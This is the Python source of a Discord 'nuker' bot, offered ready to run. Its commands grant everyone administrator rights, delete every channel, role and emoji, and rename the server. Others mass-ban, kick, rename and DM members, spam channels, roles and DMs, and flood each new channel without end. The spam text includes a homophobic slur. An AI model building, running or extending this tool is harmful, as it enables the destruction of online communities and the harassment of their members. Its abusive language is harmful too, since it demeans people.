import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "UR BOT TOKEN HERE"

SPAM_CHANNEL =  ["easy", "we run you" , "shit server" , "nuked"]
SPAM_CHANNEL_AMOUNT = 40
SPAM_MESSAGE = ["@everyone Nuked faggots"] 
GUILD_NAME = "L Server"
GUILD_ICON_CHANGE_FILE_NAME = 'image78.jpeg'
ROLE_CREATE_NAME = "this is a role"
ROLE_SPAM_AMOUNT = 20
#     if you dont specify any name while running the command "nickall" it will change-
#     the Nicknames to the name below 
NICKALL = "Nuked"
PREFIX = "!"
BOT_STATUS = "Ready to be used"
#     If you only send these commands "vcspam" , "caspam" or "cspam" without a name or amount, it will spam 
#     the amount and name below for each command
VCSPAM_AMOUNT = 10
VCSPAM_NAME = "kek"
CSPAM_AMOUNT = 10
CSPAM_NAME = "kek"
CASPAM_AMOUNT = 10
CASPAM_NAME = "kek"
DM_ALL_MESSAGE = "Hello"

#     Nuker Settings to chose what you want to Bot to do once u run !nuke
#     Write "True" if you want the Bot to do it or "False" if you dont want it
#     Guildnuke Command will do everything

giveadmin = True
channeldel = True
roledel = True
emojidel = True
guildicon = True
guildname = True
rolespam = True

#   To also have change guild icon,
#   Download the image you want and name it whatever you want. Try and make the name unique.
#   Then change the Variable GUILD_ICON_CHANGE_FILE_NAME to the Icons file name so it changes it in 
#   the code also, enjoy

intents = discord.Intents.all()
client = commands.Bot(command_prefix=PREFIX, intents=intents)
# incase u wana add a help message on ur own
client.remove_command("help")


@client.event
async def on_ready():
   print(f'''{Fore.MAGENTA}
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
  {Fore.MAGENTA}Commands
      {Fore.MAGENTA}!nuke
         {Fore.LIGHTYELLOW_EX}Will Nuke the Server{Fore.RESET}
      {Fore.MAGENTA}!stop
         {Fore.LIGHTYELLOW_EX}Will stop the Nuke and will log out of the Bot{Fore.RESET}
      {Fore.MAGENTA}!guildnuke <guildid>
         {Fore.LIGHTYELLOW_EX}Will Nuke the Server you Mentioned(Use !guilds to see Bots guilds to easily copy the Server ID{Fore.RESET}
      {Fore.MAGENTA}!nickall <nickname>
         {Fore.LIGHTYELLOW_EX}Will Change every members nickname to whatever you want{Fore.RESET}
      {Fore.MAGENTA}!banall
         {Fore.LIGHTYELLOW_EX}Will ban all the members in the Server{Fore.RESET}
      {Fore.MAGENTA}!kickall
         {Fore.LIGHTYELLOW_EX}Will kick all the members in the Server{Fore.RESET}
      {Fore.MAGENTA}!dmall
         {Fore.LIGHTYELLOW_EX}Will DM every member Possible with a already set message{Fore.RESET}
      {Fore.MAGENTA}!dmspam <user> <amount> <message>
         {Fore.LIGHTYELLOW_EX}Will Spam a Users DM's with a set message and sent amount{Fore.RESET}
      {Fore.MAGENTA}!vcspam <amount> <name> 
         {Fore.LIGHTYELLOW_EX}Will Spam VC's with whatver amount and name you like{Fore.RESET}
      {Fore.MAGENTA}!cspam <amount> <name> 
         {Fore.LIGHTYELLOW_EX}Will Spam Text Channel's with whatver amount and name you like{Fore.RESET}
      {Fore.MAGENTA}!caspam <amount> <name> 
         {Fore.LIGHTYELLOW_EX}Will Spam Category's with whatver amount and name you like{Fore.RESET}
         ''')
   await client.change_presence(activity=discord.Game(name=BOT_STATUS))

@client.command()
async def stop (ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    if giveadmin == True:
      try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print(Fore.GREEN + "Given everyone admin." + Fore.RESET)
      except:
        print(Fore.RED + "Was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      if channeldel == True:
        try:
          await channel.delete()
          print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
        except:
          print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
    for role in guild.roles:
      if roledel == True:
        try:
          await role.delete()
          print(Fore.LIGHTMAGENTA_EX + f"{role.name} Has been deleted" + Fore.RESET)
        except:
          print(Fore.RED + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
      if emojidel == True:
        try:
          await emoji.delete()
          print(Fore.GREEN + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
          print(Fore.RED + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    guild = ctx.message.guild
    if guildicon == True:
      with open(GUILD_ICON_CHANGE_FILE_NAME, 'rb') as f:
        icon = f.read()
    await guild.edit(icon=icon)
    print(Fore.GREEN + "Guild Icon Changed" + Fore.RESET)
    guild = ctx.message.guild
    if guildname == True:
      await guild.edit(name=GUILD_NAME)
      print(f"{Fore.GREEN}Guild name changed successfully{Fore.RESET}")
    await guild.create_text_channel("Nuked ur shit server")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite Created: {link}")
    amount = SPAM_CHANNEL_AMOUNT
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    if rolespam == True:
      for i in range(ROLE_SPAM_AMOUNT):
        role = await ctx.guild.create_role(name=ROLE_CREATE_NAME)
        await role.edit(colour=discord.Colour(random.randint(0, 16777215)))
        print(f"{Fore.GREEN}Succesfully Created {amount} Roles{Fore.RESET}")
    return


@client.command()
async def guildnuke(ctx, guild_id):
    await ctx.message.delete()
    guild = client.get_guild(int(guild_id))
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + "Gave everyone admin." + Fore.RESET)
    except:
      print(Fore.RED + "Was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.LIGHTMAGENTA_EX + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    with open(GUILD_ICON_CHANGE_FILE_NAME, 'rb') as f:
        icon = f.read()
    await guild.edit(name='Name', icon=icon)
    print(Fore.GREEN + "Guild Icon Changed" + Fore.RESET)
    await guild.edit(name=GUILD_NAME)
    print(f"{Fore.GREEN}Guild name changed successfully{Fore.RESET}")
    await guild.create_text_channel("Nuked ur shit server")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = SPAM_CHANNEL_AMOUNT
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully using 'guildnuke' command")
    return

@client.command()
async def guilds(ctx):
    embed = discord.Embed(title="Bot Guilds", description="", color=0x00ff00)
    for guild in client.guilds:
        embed.add_field(name=guild.name, value=guild.id)
    await ctx.send(embed=embed)

@client.command()
async def banall(ctx):
 await ctx.message.delete()
 print("Trying to Ban all members")
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"{Fore.GREEN}Banned '{user}'{Fore.RESET}")
        except:
           print(f"{Fore.RED}Coudln't Ban '{user}'{Fore.RESET}")
  

@client.command()
async def kickall(ctx):
 await ctx.message.delete()
 print("Trying to Kick all members")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"{Fore.GREEN}Kicked '{user}'{Fore.RESET}")
        except:
           print(f"{Fore.RED}Coudln't Kick '{user}'{Fore.RESET}")


@client.command()
async def nickall(ctx, *, name=NICKALL):
  print(f"Trying to change nickname of all members to '{name}'")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
      print(f"{Fore.GREEN}Changed {member} nickname to {name}{Fore.RESET}")
    except:
      print(f"{Fore.RED}Coudln't change {member}'s nickname to {name}{Fore.RESET}")

@client.command()
async def dmall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            if member.id == client.user.id:
                pass
            else:
                await member.send(DM_ALL_MESSAGE)
                print(f"{Fore.GREEN}Sent DM to {member}{Fore.RESET}")
                # To not get rate limited I added 1s delay between each DM
                await asyncio.sleep(1)
        except:
            print(f"{Fore.RED}Couldn't send DM to {member}{Fore.RESET}")

@client.command()
async def dmspam(ctx, user: discord.Member, amount, *, message):
    await ctx.message.delete()
    for i in range(int(amount)):
        await user.send(message)
    print(f"{Fore.GREEN}Sent {amount} DM's to {user.mention} {Fore.RESET}")

@client.command()
async def vcspam(ctx, amount=VCSPAM_AMOUNT, *, name=VCSPAM_NAME):
  await ctx.message.delete()
  for i in range(int(amount)):
      await ctx.guild.create_voice_channel(VCSPAM_NAME)
  print(f"{Fore.GREEN}Created {amount} of Voice Channels with the name {VCSPAM_NAME}")


@client.command()
async def cspam(ctx, amount=CSPAM_AMOUNT, *, name=CSPAM_NAME):
  await ctx.message.delete()
  for i in range(int(amount)):
      await ctx.guild.create_text_channel(CSPAM_NAME)
  print(f"{Fore.GREEN}Created {amount} of Text Channels with the name {CSPAM_NAME}")

@client.command()
async def caspam(ctx, amount=CASPAM_AMOUNT, *, name=CASPAM_NAME):
  await ctx.message.delete()
  for i in range(int(amount)):
      await ctx.guild.create_category(CASPAM_NAME)
  print(f"{Fore.GREEN}Created {amount} of Categorys with the name {CASPAM_NAME}")

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)
